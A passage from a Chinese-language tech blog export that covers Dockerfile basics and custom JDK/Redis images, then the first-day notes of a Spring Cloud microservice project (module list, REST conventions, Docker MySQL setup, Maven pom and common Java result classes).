<h1 id="第五章-Docker自定义镜像"><a href="#第五章-Docker自定义镜像" class="headerlink" title="第五章 Docker自定义镜像"></a>第五章 Docker自定义镜像</h1><h2 id="5-1-认识Dockerfile文件"><a href="#5-1-认识Dockerfile文件" class="headerlink" title="5.1 认识Dockerfile文件"></a>5.1 认识Dockerfile文件</h2><p>Dockerfile是用于构建Dockerj镜像，Dockerfile文件是由一行行命令语句组成，基于这些命令就可以构建一个镜像。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> XXX/jdk:<span class="number">8</span></span><br><span class="line"><span class="keyword">maintainer</span> docker_user</span><br><span class="line"><span class="keyword">env</span> java_home /usr/local/java</span><br><span class="line"><span class="keyword">add</span><span class="bash"> apache-tomcat-8.0.32.tar.gz /usr/<span class="built_in">local</span>/</span></span><br><span class="line"><span class="keyword">run</span><span class="bash"> mv apache-tomcat-8.0.32 tomcat8</span></span><br><span class="line"><span class="keyword">expose</span> <span class="number">8080</span></span><br><span class="line"><span class="keyword">run</span><span class="bash"> chmod u+x /usr/<span class="built_in">local</span>/tomcat8/bin/*.sh</span></span><br><span class="line"><span class="keyword">cmd</span><span class="bash"> /usr/<span class="built_in">local</span>/tomcat8/bin/catalina.sh start</span></span><br></pre></td></tr></table></figure>
<h2 id="5-2-Dockerfile的基本结构"><a href="#5-2-Dockerfile的基本结构" class="headerlink" title="5.2 Dockerfile的基本结构"></a>5.2 Dockerfile的基本结构</h2><p>一般的，Dockerfile分为四个部分</p>
<p>基础镜像信息；</p>
<p>维护者信息；</p>
<p>镜像操作指令；</p>
<p>容器启动时的指令；</p>
<h2 id="5-3-Dockerfile指令"><a href="#5-3-Dockerfile指令" class="headerlink" title="5.3 Dockerfile指令"></a>5.3 Dockerfile指令</h2><p><strong>FROM</strong></p>
<p>格式为<code>from &lt;image&gt;</code>或者<code>from &lt;image&gt;:&lt;tag&gt;</code></p>
<p>Dockerfile文件的第一条指令必须为from指令。并且，如果在同一个Dockerfile中创建多个镜像时，可以使用多个from指令；</p>
<p><strong>MAINTAINER</strong></p>
<p>格式为<code>maintainer &lt;name&gt;</code>，指定维护者信息；</p>
<p><strong>ENV</strong></p>
<p>格式为<code>env &lt;key&gt;&lt;value&gt;</code>，指定一个环境变量，会被后续run指令使用，并在容器运行时保持；</p>
<p><strong>ADD</strong></p>
<p>格式为<code>add &lt;src&gt;&lt;dest&gt;</code>；</p>
<p>复制指定的<code>&lt;src&gt;</code>到容器中的<code>&lt;dest&gt;</code></p>
<p><strong>EXPOSE</strong></p>
<p>格式为<code>expose &lt;port&gt;[&lt;port&gt;...]</code></p>
<p>告诉Docker服务端容器暴露的端口号，供互联系统使用，在启动容器时需要通过-p映射端口，Docker主机会自动分配一个端口转发到指定的端口；</p>
<p><strong>RUN</strong></p>
<p>格式为<code>run &lt;command&gt;</code></p>
<p>指定启动容器是执行的命令，每个Dockerfile只能有一条cmd命令。若果指定了多条命令，只有最后一条会被执行。</p>
<p>如果用户启动容器的时候指定了运行的命令，则会覆盖掉cmd指定的命令。</p>
<h2 id="5-4-Dockerfile自定义镜像"><a href="#5-4-Dockerfile自定义镜像" class="headerlink" title="5.4 Dockerfile自定义镜像"></a>5.4 Dockerfile自定义镜像</h2><h3 id="5-4-1-自定义JDK镜像"><a href="#5-4-1-自定义JDK镜像" class="headerlink" title="5.4.1 自定义JDK镜像"></a>5.4.1 自定义JDK镜像</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> centos:latest</span><br><span class="line"><span class="keyword">maintainer</span> qnjy</span><br><span class="line"><span class="keyword">add</span><span class="bash"> jdk-8u121-lunux-x64.tar.gz/usr/<span class="built_in">local</span></span></span><br><span class="line"><span class="keyword">env</span> JAVA_HOME /usr/local/jdk1.<span class="number">8.0</span>_121</span><br><span class="line"><span class="keyword">env</span> CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"><span class="keyword">env</span> PATH $PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="keyword">cmd</span><span class="bash"> java-version</span></span><br></pre></td></tr></table></figure>
<p>构建镜像：<code>docker build -t qnjy_jdk1.8.0_121</code></p>
<p>运行容器：<code>docker run -d ac1928798dfr</code></p>
<h3 id="5-4-2-自定义Redis镜像"><a href="#5-4-2-自定义Redis镜像" class="headerlink" title="5.4.2 自定义Redis镜像"></a>5.4.2 自定义Redis镜像</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> centos:centos6</span><br><span class="line"><span class="keyword">maintainer</span> qnjy</span><br><span class="line"><span class="keyword">run</span><span class="bash"> yum install epel-release -y &amp;&amp; yum install redis -y &amp;&amp; yum install net-tools -y</span></span><br><span class="line"><span class="keyword">expose</span> <span class="number">6379</span></span><br><span class="line"><span class="keyword">cmd</span><span class="bash"> /usr/bin/redis-server</span></span><br></pre></td></tr></table></figure>
<p>构建镜像：<code>docker build -t qnjy-redis</code></p>
<p>运行镜像：<code>docker run -d -p 6379:6379 390583cf0531</code></p>
<h2 id="5-5-镜像发布到仓库"><a href="#5-5-镜像发布到仓库" class="headerlink" title="5.5 镜像发布到仓库"></a>5.5 镜像发布到仓库</h2><h3 id="5-5-1-阿里云容器镜像仓库"><a href="#5-5-1-阿里云容器镜像仓库" class="headerlink" title="5.5.1 阿里云容器镜像仓库"></a>5.5.1 阿里云容器镜像仓库</h3><p>网址：<a href="https://dev.aliyun.com">https://dev.aliyun.com</a></p>
<h3 id="5-5-2-发布镜像到阿里云仓库"><a href="#5-5-2-发布镜像到阿里云仓库" class="headerlink" title="5.5.2 发布镜像到阿里云仓库"></a>5.5.2 发布镜像到阿里云仓库</h3><p>docker run -p 6379:6379 —name myredis -v /usr/local/docker/redis.conf:/etc/redis/redis.conf -v /usr/local/docker/data:/data -d redis redis-server /etc/redis/redis.conf —appendonly yes</p>
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>十次方项目-day01</title>
    <url>/post/90ceb441.html</url>
    <content><![CDATA[<p>　　学了好长时间了，应该认真分析一个项目，了解一个项目的开发流程、顺序、模式等<span id="more"></span></p>
<h1 id="1-系统设计"><a href="#1-系统设计" class="headerlink" title="1 系统设计"></a>1 系统设计</h1><h2 id="1-1-开发模式"><a href="#1-1-开发模式" class="headerlink" title="1.1 开发模式"></a>1.1 开发模式</h2><p>采用前后端分离的开发模式</p>
<h2 id="1-2-技术选型"><a href="#1-2-技术选型" class="headerlink" title="1.2 技术选型"></a>1.2 技术选型</h2><p>前端：nodejs+NUXT+elementUI+vue</p>
<p>后端：springboot+springcloud+mybatis plus + mysql 5.7</p>
<h2 id="1-3-技术架构"><a href="#1-3-技术架构" class="headerlink" title="1.3 技术架构"></a>1.3 技术架构</h2><p>前后端分离的系统架构</p>
<h2 id="1-4-微服务模块划分"><a href="#1-4-微服务模块划分" class="headerlink" title="1.4 微服务模块划分"></a>1.4 微服务模块划分</h2><div class="table-container">
<table>
<thead>
<tr>
<th>模块名称</th>
<th>模块中文名称</th>
</tr>
</thead>
<tbody>
<tr>
<td>tensquare_common</td>
<td>公共模块</td>
</tr>
<tr>
<td>tensquare_base</td>
<td>基础微服务</td>
</tr>
<tr>
<td>tensquare_article</td>
<td>文章微服务</td>
</tr>
<tr>
<td>tensquare_friend</td>
<td>交友微服务</td>
</tr>
<tr>
<td>tensquare_gathering</td>
<td>活动微服务</td>
</tr>
<tr>
<td>tensquare_qa</td>
<td>问答微服务</td>
</tr>
<tr>
<td>tensquare_recruit</td>
<td>招聘微服务</td>
</tr>
<tr>
<td>tensquare_user</td>
<td>用户微服务</td>
</tr>
<tr>
<td>tensquare_spit</td>
<td>吐槽微服务</td>
</tr>
<tr>
<td>tensquare_search</td>
<td>搜索微服务</td>
</tr>
<tr>
<td>tensquare_web</td>
<td>前台微服务网关</td>
</tr>
<tr>
<td>tensquare_manager</td>
<td>后台微服务网关</td>
</tr>
<tr>
<td>tensquare_eureka</td>
<td>注册中心</td>
</tr>
<tr>
<td>tensquare_config</td>
<td>配置中心</td>
</tr>
<tr>
<td>tensquare_sms</td>
<td>短信微服务</td>
</tr>
<tr>
<td>tensquare_notice</td>
<td>消息通知微服务</td>
</tr>
</tbody>
</table>
</div>
<h2 id="1-5-建数据库表结构分析"><a href="#1-5-建数据库表结构分析" class="headerlink" title="1.5 建数据库表结构分析"></a>1.5 建数据库表结构分析</h2><p>采用的分库分表设计，每个微服务模块为1个独立的数据库。</p>
<p>​    tensquare_article  文章</p>
<p>​    tensquare_base    基础</p>
<p>​    tensquare_friend   交友</p>
<p>​    tensquare_gathering 活动</p>
<p>​    tensquare_qa 问答</p>
<p>​    tensquare_recruit 招聘</p>
<p>​    tensquare_user   用户</p>
<p>​    tensquare_spit   吐槽</p>
<h2 id="1-6-API文档"><a href="#1-6-API文档" class="headerlink" title="1.6 API文档"></a>1.6 API文档</h2><p>前后端约定的返回码列表：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>状态描述</th>
<th>返回码</th>
</tr>
</thead>
<tbody>
<tr>
<td>成功</td>
<td>20000</td>
</tr>
<tr>
<td>失败</td>
<td>20001</td>
</tr>
<tr>
<td>用户名或密码错误</td>
<td>20002</td>
</tr>
<tr>
<td>权限不足</td>
<td>20003</td>
</tr>
<tr>
<td>远程调用失败</td>
<td>20004</td>
</tr>
<tr>
<td>重复操作</td>
<td>20005</td>
</tr>
</tbody>
</table>
</div>
<h1 id="2-接口规范"><a href="#2-接口规范" class="headerlink" title="2 接口规范"></a>2 接口规范</h1><p>十次方项目使用GET、POST、PUT、DELETE四种方法</p>
<p>​    幂等性：不论你请求多少次，资源的状态是一样的。</p>
<h3 id="2-1-GET"><a href="#2-1-GET" class="headerlink" title="2.1 GET"></a>2.1 GET</h3><ul>
<li>安全且幂等</li>
<li>获取表示</li>
<li>变更时获取表示（缓存）</li>
</ul>
<p>==适合查询类的接口使用==</p>
<h3 id="2-2-POST"><a href="#2-2-POST" class="headerlink" title="2.2 POST"></a>2.2 POST</h3><ul>
<li>不安全且不幂等</li>
<li>使用服务端管理的（自动产生）的实例号创建资源</li>
<li>创建子资源</li>
<li>部分更新资源</li>
<li>如果没有被修改，则不过更新资源（乐观锁）</li>
</ul>
<p>==适合数据提交类的接口使用==</p>
<h3 id="2-3-PUT"><a href="#2-3-PUT" class="headerlink" title="2.3 PUT"></a>2.3 PUT</h3><ul>
<li>不安全但幂等</li>
<li>用客户端管理的实例号创建一个资源</li>
<li>通过替换的方式更新资源</li>
<li><p>如果未被修改，则更新资源（乐观锁）</p>
<p>==适合更新数据的接口使用==</p>
</li>
</ul>
<h3 id="2-4-DELETE"><a href="#2-4-DELETE" class="headerlink" title="2.4 DELETE"></a>2.4 DELETE</h3><ul>
<li>不安全但幂等</li>
<li>删除资源</li>
</ul>
<p>==适合删除数据的接口使用==</p>
<p>请求返回响应码：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>代码</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>==200==</td>
<td>（OK）- 如果现有资源已被更改</td>
</tr>
<tr>
<td>201</td>
<td>（created）- 如果新资源被创建</td>
</tr>
<tr>
<td>202</td>
<td>（accepted）- 已接受处理请求但尚未完成（异步处理）</td>
</tr>
<tr>
<td>301</td>
<td>（Moved Permanently）- 资源的URI被更新</td>
</tr>
<tr>
<td>303</td>
<td>（See Other）- 其他（如，负载均衡）</td>
</tr>
<tr>
<td>==400==</td>
<td>（bad request）- 指代坏请求</td>
</tr>
<tr>
<td>==404==</td>
<td>（not found）- 资源不存在</td>
</tr>
<tr>
<td>406</td>
<td>（not acceptable）- 服务端不支持所需表示</td>
</tr>
<tr>
<td>409</td>
<td>（conflict）- 通用冲突</td>
</tr>
<tr>
<td>412</td>
<td>（Precondition Failed）- 前置条件失败（如执行条件更新时的冲突）</td>
</tr>
<tr>
<td>415</td>
<td>（unsupported media type）- 接受到的表示不受支持</td>
</tr>
<tr>
<td>==500==</td>
<td>（internal server error）- 通用错误响应</td>
</tr>
<tr>
<td>503</td>
<td>（Service Unavailable）- 服务当前无法处理请求</td>
</tr>
</tbody>
</table>
</div>
<h1 id="3-项目开发准备"><a href="#3-项目开发准备" class="headerlink" title="3 项目开发准备"></a>3 项目开发准备</h1><h2 id="3-1-开发环境"><a href="#3-1-开发环境" class="headerlink" title="3.1 开发环境"></a>3.1 开发环境</h2><ul>
<li>虚拟系统环境 VMware Workstation</li>
<li>虚拟机系统 CentOS 7</li>
<li>容器 docker</li>
<li>JDK1.8</li>
<li>数据库 mysql 5.7</li>
<li>开发工具 idea</li>
<li>项目构建工具 maven<!--more--></li>
</ul>
<h2 id="3-2-mysql建库建表"><a href="#3-2-mysql建库建表" class="headerlink" title="3.2 mysql建库建表"></a>3.2 mysql建库建表</h2><p>所有的第三方工具如mysql等都是运行在docker容器中的<br><code>注：虚拟机的帐户名root 密码itcast</code></p>
<p>进入安装了docker的虚拟机中，按以下顺序执行命令</p>
<p><strong>（1）下载镜像（此步可省略）</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> pull centos/mysql-<span class="number">57</span>-centos<span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>注：docker默认从国外的镜像网站拉取镜像，速度很慢。可以使用国内的阿里云镜像加速站点提升镜像拉取速度。具体步骤可以参考文档</p>
<p>docker配置国内镜像加速站点.pdf</p>
<p><strong>（2）创建容器</strong></p>
<p><img src="https://s3.ax1x.com/2021/01/18/scYR1O.jpg" alt="scYR1O.jpg"></p>
<p><img src="https://s3.ax1x.com/2021/01/18/scYa1U.md.jpg" alt="scYa1U.md.jpg"></p>
<p><img src="https://s3.ax1x.com/2021/01/18/scYwX4.jpg" alt="scYwX4.jpg" style="zoom:50%;" /></p>
<p><img src="https://s3.ax1x.com/2021/01/18/scYBnJ.md.jpg" alt="scYBnJ.md.jpg"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> -di <span class="attribute">--name</span>=tensquare_mysql -p 3306:3306 -e</span><br><span class="line"><span class="attribute">MYSQL_ROOT_PASSWORD</span>=root centos/mysql-57-centos7</span><br></pre></td></tr></table></figure>
<p><strong>（3）连接MYSQL ，并执行资料中的建表脚本，创建article数据库</strong></p>
<h2 id="3-3-接口测试工具postman"><a href="#3-3-接口测试工具postman" class="headerlink" title="3.3 接口测试工具postman"></a>3.3 接口测试工具postman</h2><p>postman是一款强大网页调试工具</p>
<ul>
<li>能够发送任何类型的HTTP 请求 (GET，HEAD， POST，PUT…)</li>
<li>附带任意数量的参数</li>
</ul>
<h1 id="4-项目工程搭建"><a href="#4-项目工程搭建" class="headerlink" title="4 项目工程搭建"></a>4 项目工程搭建</h1><h2 id="4-1-父工程搭建"><a href="#4-1-父工程搭建" class="headerlink" title="4.1 父工程搭建"></a>4.1 父工程搭建</h2><p>创建项目类型为maven的父工程</p>
<p>1.选择file-new project，选择maven，点击next</p>
<p><img src="https://s3.ax1x.com/2021/01/18/scYDB9.md.png" alt="scYDB9.md.png" style="zoom:67%;" /> </p>
<p>2.GroupId填写com.tensquare，ArtifacetId填写tensquare_parent，点击next</p>
<p><img src="https://s3.ax1x.com/2021/01/18/scYdcF.md.png" alt="scYdcF.md.png" style="zoom:67%;" /></p>
<p>3.点击Finash完成</p>
<p>4.修改pom.xml文件，添加以下内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mybatisplus-spring-bootstarter.version</span>&gt;</span>1.0.5<span class="tag">&lt;/<span class="name">mybatisplus-spring-bootstarter.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mybatisplus.version</span>&gt;</span>2.2.0<span class="tag">&lt;/<span class="name">mybatisplus.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">fastjson.version</span>&gt;</span>1.2.39<span class="tag">&lt;/<span class="name">fastjson.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">gson.version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">gson.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="4-2-搭建公共子模块"><a href="#4-2-搭建公共子模块" class="headerlink" title="4.2 搭建公共子模块"></a>4.2 搭建公共子模块</h2><h3 id="4-2-1-搭建子模块步骤"><a href="#4-2-1-搭建子模块步骤" class="headerlink" title="4.2.1 搭建子模块步骤"></a>4.2.1 搭建子模块步骤</h3><p>1.右键点击父工程tensquare_parent，选择New-&gt;Module弹出窗口选择Maven，点击next</p>
<p>2.ArtifacetId填写tensquare_common，点击next</p>
<p><img src="https://s3.ax1x.com/2021/01/18/scYr7R.md.png" alt="scYr7R.md.png"></p>
<p>3.点击finish</p>
<h3 id="4-2-1-创建公共实体类和工具类"><a href="#4-2-1-创建公共实体类和工具类" class="headerlink" title="4.2.1 创建公共实体类和工具类"></a>4.2.1 创建公共实体类和工具类</h3><p>1.新建com.tensquare.entity包，包下创建Result类，用于controller返回结果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Result</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Boolean flag;<span class="comment">//是否成功</span></span><br><span class="line">    <span class="keyword">private</span> Integer code;<span class="comment">//返回码</span></span><br><span class="line">    <span class="keyword">private</span> String message;<span class="comment">//返回信息</span></span><br><span class="line">    <span class="keyword">private</span> Object data;<span class="comment">//返回数据</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Result</span><span class="params">(Boolean flag, Integer code, String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">        <span class="keyword">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Result&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;flag=&quot;</span> + flag +</span><br><span class="line">            <span class="string">&quot;, code=&quot;</span> + code +</span><br><span class="line">            <span class="string">&quot;, message=&#x27;&quot;</span> + message + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&quot;, data=&quot;</span> + data +</span><br><span class="line">            <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">getFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFlag</span><span class="params">(Boolean flag)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCode</span><span class="params">(Integer code)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setData</span><span class="params">(Object data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Result</span><span class="params">(Boolean flag, Integer code, String message, Object data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">        <span class="keyword">this</span>.message = message;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.创建类PageResult，用于返回分页结果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageResult</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long total;</span><br><span class="line">    <span class="keyword">private</span> List&lt;T&gt; rows;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;PageResult&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;total=&quot;</span> + total +</span><br><span class="line">                <span class="string">&quot;, rows=&quot;</span> + rows +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PageResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PageResult</span><span class="params">(Long total, List&lt;T&gt; rows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.total = total;</span><br><span class="line">        <span class="keyword">this</span>.rows = rows;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getTotal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTotal</span><span class="params">(Long total)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.total = total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;T&gt; <span class="title">getRows</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rows;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRows</span><span class="params">(List&lt;T&gt; rows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.rows = rows;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.返回码定义类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StatusCode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> OK = <span class="number">20000</span>;<span class="comment">//成功</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> ERROR = <span class="number">20001</span>;<span class="comment">//失败</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> LOGINERROR = <span class="number">20002</span>;<span class="comment">//用户名或密码错误</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> ACCESSERROR = <span class="number">20003</span>;<span class="comment">//权限不足</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> REMOTEERROR = <span class="number">20004</span>;<span class="comment">//远程调用失败</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> REPERROR = <span class="number">20005</span>;<span class="comment">//重复操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>4.分布式ID生成器</strong></p>
<p><a href="#1 IdWorker.java">附录/IdWorker.java</a></p>
<p>tensquare_common工程创建util包，将IdWorker.java直接拷贝到<br>tensquare_common工程的util包中。</p>
<p>不能使用数据库本身的自增功能来产生主键值，原因是生产环境为分片部署的。<br>使用snowflake （雪花）算法（twitter出品）生成唯一的主键值</p>
<p><img src="https://s3.ax1x.com/2021/01/18/scY29K.md.png" alt="scY29K.md.png"></p>
<ul>
<li>41bit的时间戳可以支持该算法使用到2082年</li>
<li>10bit的工作机器id可以支持1024台机器</li>
<li>序列号支持1毫秒产生4096个自增序列id</li>
<li>整体上按照时间自增排序</li>
<li>整个分布式系统内不会产生ID碰撞</li>
<li>每秒能够产生26万ID左右</li>
</ul>
<h1 id="5-文章微服务-文章管理"><a href="#5-文章微服务-文章管理" class="headerlink" title="5 文章微服务-文章管理"></a>5 文章微服务-文章管理</h1><h2 id="5-1-模块搭建"><a href="#5-1-模块搭建" class="headerlink" title="5.1 模块搭建"></a>5.1 模块搭建</h2><ol>
<li>在tensquare_parent项目下创建tensquare_article模块，创建过程参考第4.2节<br>公共子模块的创建过程</li>
<li>修改tensquare_article模块的pom.xml文件，修改添加以下依赖</li>
</ol>
